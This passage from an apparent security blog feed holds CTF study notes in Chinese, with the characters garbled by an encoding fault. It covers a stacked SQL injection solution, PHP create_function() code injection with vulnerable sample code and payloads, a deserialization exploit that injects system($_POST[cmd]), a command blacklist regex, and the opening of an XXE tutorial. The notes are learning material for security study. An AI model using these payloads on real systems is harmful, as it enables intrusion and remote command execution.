class="hljs-number">1</span><span class="hljs-string">&#x27;; alter table words rename to words1;</span><br><span class="hljs-string">alter table `1919810931114514` rename to words;</span><br><span class="hljs-string">alter table words change flag id varchar(50);# `</span><br></code></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡<code>1&#39; or 1 = 1 #</code>ï¼ŒæˆåŠŸè·å–åˆ°flagã€‚ </p><ul><li>ä¿®æ”¹è¡¨åï¼š<code>ALTER TABLE æ—§è¡¨å RENAME TO æ–°è¡¨åï¼›</code></li><li>ä¿®æ”¹å­—æ®µï¼š<code>ALTER TABLE è¡¨å CHANGE æ—§å­—æ®µå æ–°å­—æ®µå æ–°æ•°æ®ç±»å‹ï¼›</code></li></ul><h3 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h3><p>æ­¤é¢˜è¿˜å¯ä»¥é€šè¿‡handleç›´æ¥å‡ºç­”æ¡ˆï¼š<code>1&#39;;HANDLER </code>1919810931114514<code>OPEN;HANDLER</code>1919810931114514<code>READ FIRST;HANDLER</code>1919810931114514<code> CLOSE;</code></p><ul><li>handleä¸æ˜¯é€šç”¨çš„SQLè¯­å¥ï¼Œæ˜¯Mysqlç‰¹æœ‰çš„ï¼Œå¯ä»¥é€è¡Œæµè§ˆæŸä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œæ ¼å¼ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">æ‰“å¼€è¡¨ï¼š<br>HANDLER è¡¨å OPEN ;<br><br>æŸ¥çœ‹æ•°æ®ï¼š<br>HANDLER è¡¨å READ next;<br><br>å…³é—­è¡¨ï¼š<br>HANDLER è¡¨å READ CLOSE;<br></code></pre></td></tr></table></figure><h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a href="https://blog.csdn.net/jonhswei/article/details/147323081">sqlæ³¨å…¥9ä¹‹å †å æ³¨å…¥-CSDNåšå®¢</a></p><p>[<a href="https://zhuanlan.zhihu.com/p/545713669">å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1ã€SQLæ³¨å…¥ã€‘å››ç§è§£æ³• - çŸ¥ä¹</a></p><p>[BUUCTF <a href="https://blog.csdn.net/m0_62879498/article/details/123292860">å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1ï¼ˆä¸¤ç§æ–¹æ³•ï¼‰-CSDNåšå®¢</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQLæ³¨å…¥</tag>
      
      <tag>å †å æ³¨å…¥</tag>
      
      <tag>æŠ¥é”™æ³¨å…¥</tag>
      
      <tag>é¢„ç¼–è¯‘è¯­å¥</tag>
      
      <tag>æ›´æ”¹è¡¨å</tag>
      
      <tag>handelè¯­å¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpä»£ç ä¹‹create_function()å‡½æ•°</title>
    <link href="/2025/10/18/php%E4%BB%A3%E7%A0%81%E4%B9%8Bcreate-function-%E5%87%BD%E6%95%B0/"/>
    <url>/2025/10/18/php%E4%BB%A3%E7%A0%81%E4%B9%8Bcreate-function-%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="phpä»£ç ä¹‹create-function-å‡½æ•°"><a href="#phpä»£ç ä¹‹create-function-å‡½æ•°" class="headerlink" title="phpä»£ç ä¹‹create_function()å‡½æ•°"></a>phpä»£ç ä¹‹create_function()å‡½æ•°</h1><p>NSSä¸Šéšæœºåˆ°çš„ä¸€é“çœ‹é¢˜ç›®æ²¡ä»€ä¹ˆæ€è·¯ï¼Œæœwpçœ‹åˆ°ç”¨åˆ°create_function()å‡½æ•°ï¼Œæœç´¢äº†è§£äº†ä¸€ä¸‹ã€‚</p><h2 id="create-function-ç®€ä»‹"><a href="#create-function-ç®€ä»‹" class="headerlink" title="create_function()ç®€ä»‹"></a>create_function()ç®€ä»‹</h2><p>é€‚ç”¨ PHP4&gt;4.0.1   PHP 5   PHP7</p><p>è¯­æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span>,  <span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span>)<br><br><span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span> å£°æ˜çš„å‡½æ•°å˜é‡éƒ¨åˆ†<br><br><span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> æ‰§è¡Œçš„æ–¹æ³•ä»£ç éƒ¨åˆ†<br></code></pre></td></tr></table></figure><p>å‡½æ•°åŠŸèƒ½ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;New anonymous function: <span class="hljs-subst">$newfunc</span>\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$newfunc</span>(<span class="hljs-number">2</span>, M_E) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p><code>create_function() </code>ä¼š<code>åˆ›é€ ä¸€ä¸ªåŒ¿åå‡½æ•°</code> (lambdaæ ·å¼)  æ­¤å¤„åˆ›å»ºäº†ä¸€ä¸ªå«  lamvda_1 çš„å‡½æ•°ï¼Œ åœ¨ç¬¬ä¸€ä¸ª echo ä¸­ æ˜¾ç¤ºåå­—ï¼Œ å¹¶<code>åœ¨ç¬¬äºŒä¸ªecho è¯­å¥ä¸­æ‰§è¡Œäº† æ­¤å‡½æ•°</code>ã€‚</p><p>create_function() å‡½æ•° ä¼š<code>åœ¨å†…éƒ¨ æ‰§è¡Œ eval()</code>  , æˆ‘ä»¬å‘ç°æ˜¯æ‰§è¡Œäº† åé¢çš„ return è¯­å¥ï¼Œå±äºcreate_function()  ä¸­çš„ç¬¬äºŒä¸ªå‚æ•° string $code  çš„ä½ç½®</p><p>å› æ­¤ï¼Œä¸Šè¿°åŒ¿åå‡½æ•°çš„åˆ›å»ºä¸æ‰§è¡Œè¿‡ç¨‹ç­‰ä»·äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda_1</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ln(<span class="hljs-subst">$a</span>) + ln(<span class="hljs-subst">$b</span>) = &quot;</span> . <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ä»£ç æ³¨å…¥å®ä¾‹"><a href="#ä»£ç æ³¨å…¥å®ä¾‹" class="headerlink" title="ä»£ç æ³¨å…¥å®ä¾‹"></a>ä»£ç æ³¨å…¥å®ä¾‹</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$sort_by</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort_by&#x27;</span>];<br><span class="hljs-variable">$sorter</span> = <span class="hljs-string">&#x27;strnatcasecmp&#x27;</span>;<br><span class="hljs-variable">$databases</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;1234&#x27;</span>,<span class="hljs-string">&#x27;4321&#x27;</span>);<br><span class="hljs-variable">$sort_function</span> = <span class="hljs-string">&#x27; return 1 * &#x27;</span> . <span class="hljs-variable">$sorter</span> . <span class="hljs-string">&#x27;($a[&quot;&#x27;</span> . <span class="hljs-variable">$sort_by</span> . <span class="hljs-string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="hljs-variable">$sort_by</span> . <span class="hljs-string">&#x27;&quot;]);&#x27;</span>;<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$databases</span>, <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a, $b&#x27;</span>, <span class="hljs-variable">$sort_function</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸€ä¸‹phpä»£ç ï¼Œè¦ä¼ å…¥ä¸€ä¸ªGETå‚æ•°èµ‹å€¼ç»™<code>$sort_by</code>ã€‚ç„¶åå®šä¹‰<code>$sorter</code>çš„å€¼æ˜¯<code> &#39;strnatcasecmp&#39;</code>,è¿™æ˜¯PHP çš„å†…ç½®æ¯”è¾ƒå‡½æ•°ï¼Œç”¨äºè‡ªç„¶æ’åºã€å¿½ç•¥å¤§å°å†™ã€‚æ¯”å¦‚ä¼ å…¥image1å’Œimage10æ—¶ï¼Œä»–ä¼šæŒ‰ç…§æ•°åºå¤§å°æ’åˆ—ã€‚</p><p>ä¹‹åå®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ³¨æ„è¿™ä¸ªæ•°å­—ä¸å«é”®å€¼å¯¹ï¼Œä½†æ˜¯åé¢çš„ä»£ç ä¼šå‡è®¾ä»–æ˜¯ä¸€ä¸ªâ€œæœ‰é”®çš„æ•°ç»„â€ã€‚</p><p>åœ¨<code>$sort_function</code>éƒ¨åˆ†ä¼šé€šè¿‡æ‹¼æ¥ç”Ÿæˆå­—ç¬¦ä¸²ã€‚æ¯”å¦‚æˆ‘ä»¬è¾“å…¥å€¼ä¸ºnameï¼Œå°±ä¼šå¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-number">1</span> * <span class="hljs-title function_ invoke__">strnatcasecmp</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-variable">$b</span>[<span class="hljs-string">&quot;name&quot;</span>]);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥æ¶æ„å‚æ•°ï¼Œæ¯”å¦‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?s</span>ort_by=a<span class="hljs-string">&quot;]);phpinfo();// </span><br></code></pre></td></tr></table></figure><p>é‚£æœ€ç»ˆæ‹¼æ¥çš„å­—ç¬¦ä¸²å°±å˜æˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-number">1</span> * <span class="hljs-title function_ invoke__">strnatcasecmp</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//&quot;], $b[&quot;a&quot;]);phpinfo();//&quot;]);</span><br></code></pre></td></tr></table></figure><p>PHP ä¼šæŠŠè¿™æ®µä»£ç äº¤ç»™ <code>create_function</code> å»æ‰§è¡Œï¼ˆä¹Ÿå°±æ˜¯usortä¸€è¡Œï¼‰ï¼Œäºæ˜¯è¿™æ®µæ‹¼æ¥çš„å­—ç¬¦ä¸²è¢«ç›´æ¥â€œæ³¨å…¥â€åˆ°äº†å‡½æ•°ä½“é‡Œï¼Œ<strong>é€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</strong>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$databases</span>, <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a, $b&#x27;</span>, <span class="hljs-variable">$sort_function</span>));<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æåˆ°ï¼Œ<code>create_function()</code> ä¼šæŠŠç¬¬äºŒä¸ªå‚æ•°å½“ä½œ PHP ä»£ç ç¼–è¯‘æˆåŒ¿åå‡½æ•°ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·å¯æ§çš„<code> $sort_function</code> ç›´æ¥è¢«å½“æˆphpæ‰§è¡Œã€‚</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$lambda</span>=<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>,<span class="hljs-string">&quot;return (strlen(<span class="hljs-subst">$a</span>)-strlen(<span class="hljs-subst">$b</span>)+&quot;</span> . <span class="hljs-string">&quot;strlen(<span class="hljs-subst">$c</span>));&quot;</span>);<br><span class="hljs-variable">$array</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;reall long string here,boy&#x27;</span>,<span class="hljs-string">&#x27;this&#x27;</span>,<span class="hljs-string">&#x27;midding lenth&#x27;</span>,<span class="hljs-string">&#x27;larget&#x27;</span>);<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$array</span>,<span class="hljs-variable">$lambda</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>$lambda</code>ä¸€è¡Œ,æ’åºæ„é€ éƒ¨åˆ†(ä¹Ÿå°±æ˜¯ä¹‹åè¦ç”Ÿæˆçš„åŒ¿åå‡½æ•°éƒ¨åˆ†ä¸­<code>$c</code>æ˜¯æˆ‘ä»¬å¯æ§çš„)ï¼Œ</p><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-number">1</span>));&#125;phpinfo();<span class="hljs-regexp">/*</span><br></code></pre></td></tr></table></figure><h3 id="0x03-NSSCTF-CanCanNeed"><a href="#0x03-NSSCTF-CanCanNeed" class="headerlink" title="0x03(NSSCTF CanCanNeed )"></a>0x03(NSSCTF CanCanNeed )</h3><p><strong>point:ååºåˆ—åŒ– creat_functionå‡½æ•°</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Noteasy</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$param1</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$param2</span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-variable language_">$this</span>-&gt;param1;<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable language_">$this</span>-&gt;param2;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|\.|log|scan|chr|local|sess|b2|id|show|cont|high|reverse|flip|rand|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|y2f/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;param2)) &#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;this param is error!&#x27;</span>); <br>        &#125; <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$b</span>); <br>        &#125;<br>    &#125;<br>    <br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    <br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hi!Welcome to FSCTF2023!&quot;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123; <br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$file</span>); &#125;<br><span class="hljs-meta">?&gt;</span><br>Hi!Welcome to FSCTF2023!<br></code></pre></td></tr></table></figure><p>åˆ†ææºä»£ç ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªGETå‹å‚æ•°fileï¼Œå‚æ•°ç»è¿‡base64è§£ç ä¹‹åèµ‹å€¼ç»™<code>$file</code>,ç„¶åè¿›è¡Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–è¿‡ç¨‹ä¼šè§¦å‘<code>__destruct()</code>é­”æœ¯æ–¹æ³•ï¼Œè¿™ä¸ªé­”æœ¯æ–¹æ³•æŠŠ<code>$param1</code>èµ‹å€¼ç»™<code>$a</code>,<code>$param2</code>ç»è¿‡è¿‡æ»¤ä¹‹åèµ‹å€¼ç»™<code>$b</code>,ä¹‹å<code>$a(&#39;&#39;, $b);</code></p><p><code>$a(&#39;&#39;, $b);</code>:</p><p><code>$a</code> æ­¤æ—¶æ˜¯ä¸ªâ€œå¯è°ƒç”¨â€ï¼ˆcallableï¼‰ï¼šé€šå¸¸æ˜¯å‡½æ•°åçš„å­—ç¬¦ä¸²ã€åŒ¿åå‡½æ•°ï¼ˆClosureï¼‰ï¼Œæˆ–è€… <code>[$obj, &#39;method&#39;]</code> è¿™æ ·çš„æ•°ç»„ã€‚</p><p><code>&#39;&#39;</code> æ˜¯ä¼ ç»™è¿™ä¸ªå¯è°ƒç”¨çš„<strong>ç¬¬ä¸€ä¸ªå‚æ•°</strong>ï¼ˆä¸€ä¸ªç©ºå­—ç¬¦ä¸²å­—é¢é‡ï¼‰ã€‚</p><p><code>$b</code> æ˜¯<strong>ç¬¬äºŒä¸ªå‚æ•°</strong>ï¼Œå€¼æ¥è‡ªä¸Šé¢ <code>$b = $this-&gt;param2;</code>ã€‚</p><p>wpä¸­ç”¨åˆ°çš„æ€è·¯æ˜¯<code>$param1= &quot;create_function&quot;;</code> <code>$param2=&quot;&#125;;system(\$_POST[cmd]);//&quot;</code></p><p>é€šè¿‡ååºåˆ—åŒ–å®ç°èµ‹å€¼å†é€šè¿‡creat_functionåŒ¿åå‡½æ•°æ‰§è¡Œ<code>$param2çš„phpä»£ç </code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Noteasy</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$param1</span>= <span class="hljs-string">&quot;create_function&quot;</span>; <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$param2</span>=<span class="hljs-string">&quot;&#125;;system(\$_POST[cmd]);//&quot;</span>; &#125; <br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Noteasy</span>(); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹<code>$param2</code>ä¸­<code>&#123; </code>çš„ä½œç”¨ï¼š</p><p><code>create_function($args, $code)</code> å†…éƒ¨ä¼š <code>eval</code> ä¸€æ®µæ¨¡æ¿ä»£ç ï¼Œç±»ä¼¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function <span class="hljs-subst">$lambda</span>(<span class="hljs-subst">$args</span>) &#123; <span class="hljs-subst">$code</span> &#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨æ¥é—­åˆ<code>create_function()</code> ç”Ÿæˆçš„å‡½æ•°ä½“çš„å¤§æ‹¬å· <code>&#123;</code>ã€‚</p><h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a href="https://blog.csdn.net/snowlyzz/article/details/127171931">PHPä»£ç  ä¹‹create_function()å‡½æ•°_create function-CSDNåšå®¢</a></p><p>[NSSCTFç¬¬15é¡µï¼ˆ3ï¼‰_<a href="https://blog.csdn.net/wwwwyyyrre/article/details/134957791">fsctf 2023]cancanneed-CSDNåšå®¢</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>create_function()å‡½æ•°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXEæ¼æ´å­¦ä¹ </title>
    <link href="/2025/10/17/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/10/17/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XXEæ¼æ´å­¦ä¹ "><a href="#XXEæ¼æ´å­¦ä¹ " class="headerlink" title="XXEæ¼æ´å­¦ä¹ "></a>XXEæ¼æ´å­¦ä¹ </h1><h1 id="XXEçš„å®šä¹‰"><a href="#XXEçš„å®šä¹‰" class="headerlink" title="XXEçš„å®šä¹‰"></a>XXEçš„å®šä¹‰</h1><p><code>XXE</code>å°±æ˜¯<code>XMLå¤–éƒ¨å®ä½“æ³¨å…¥</code>ï¼ŒXMLä¸­æœ‰5ç§å®ä½“ï¼Œå¦‚æœç½‘ç«™å…è®¸ä½¿ç”¨<strong>å¤–éƒ¨å®ä½“</strong>ï¼Œé€šè¿‡æ¶æ„æ„é€ å†…å®¹å°±æœ‰å¯èƒ½å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€å†…ç½‘æ¢æµ‹ã€å‘½ä»¤æ‰§è¡Œç­‰ã€‚</p><h2 id="ç®€å•äº†è§£XML"><a href="#ç®€å•äº†è§£XML" class="headerlink" title="ç®€å•äº†è§£XML"></a>ç®€å•äº†è§£XML</h2><p>XMLæŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆExtensibleMarkupLanguage)ï¼Œæ˜¯ä¸€ç§ä¸HTMLç±»ä¼¼çš„çº¯æ–‡æœ¬çš„æ ‡è®°è¯­è¨€ï¼Œ<br>å®ƒç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼šæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDocumentType Definitionï¼ŒDTDï¼‰ï¼Œå³XMLçš„å¸ƒå±€è¯­è¨€ï¼›å¯æ‰©å±•çš„æ ·å¼è¯­è¨€ï¼ˆExtensible StyleLanguageï¼ŒXSLï¼‰ï¼Œå³XMLçš„æ ·å¼è¡¨è¯­è¨€ï¼›ä»¥åŠå¯æ‰©å±•é“¾æ¥è¯­è¨€ï¼ˆExtensibleLinkLanguageï¼ŒXLL)</p><p>XMLæ ¼å¼è§„èŒƒæ˜¯ç”±DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰æ¥å†³å®šçš„&gt;</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;//è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰<br>&lt;!DOCTYPE message [<br>&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;<br>&lt;!ELEMENT receiver (#PCDATA)&gt;<br>&lt;!ELEMENT sender (#PCDATA)&gt;<br>&lt;!ELEMENT header (#PCDATA)&gt;<br>&lt;!ELEMENT msg (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªDTDå°±å®šä¹‰äº†XMLçš„æ ¹å…ƒç´ æ˜¯messageï¼Œè€Œåæœ‰ä¸€äº›å­å…ƒç´ receiveã€senderç­‰ï¼Œè§„å®šäº†æ ¼å¼çš„XMLå°±éœ€è¦å†™æˆå¦‚ä¸‹è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;message&gt;<br>&lt;receiver&gt;Yourself&lt;receiver&gt;<br>&lt;send&gt;People&lt;send&gt;<br>&lt;header&gt;balabala&lt;/header&gt;<br>&lt;msg&gt;xxe&lt;/msg&gt;<br>&lt;/message&gt;<br></code></pre></td></tr></table></figure><p>é™¤äº†èƒ½åœ¨DTDä¸­å®šä¹‰å…ƒç´ å¤–è¿˜èƒ½åœ¨å…¶ä¸­å®šä¹‰å®ä½“ï¼Œå…è®¸å¤–éƒ¨å®ä½“å¯èƒ½ä¼šå­˜åœ¨XXEæ³¨å…¥ï¼Œè€Œå‚æ•°å®ä½“åˆæ˜¯Blind OOB XXEçš„å¿…è¦æ¡ä»¶ã€‚</p><p>å…ˆè§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯å¤–éƒ¨å®ä½“å’Œå†…éƒ¨å®ä½“ã€‚</p><p>æŠŠå®ä½“æŒ‰ç…§<code>ä½¿ç”¨æ–¹å¼</code>åˆ†ç±»ï¼Œå¯ä»¥åˆ†ä¸º<code>å†…éƒ¨å£°æ˜å®ä½“</code>å’Œ<code>å¤–éƒ¨å¼•ç”¨å®ä½“</code>ã€‚</p><p>å†…éƒ¨å®ä½“ï¼š<code>&lt;ï¼ENTITYå®ä½“åç§°&quot;å®ä½“çš„å€¼&quot;&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.o&quot; encoding = &quot;utf-8&quot;?&gt;<br><br>&lt;!DOCTYPE test [<br>&lt;!ENTITY writer &quot;xxx&quot;&gt;<br>&lt;!ENTITY copyright &quot;Copyright 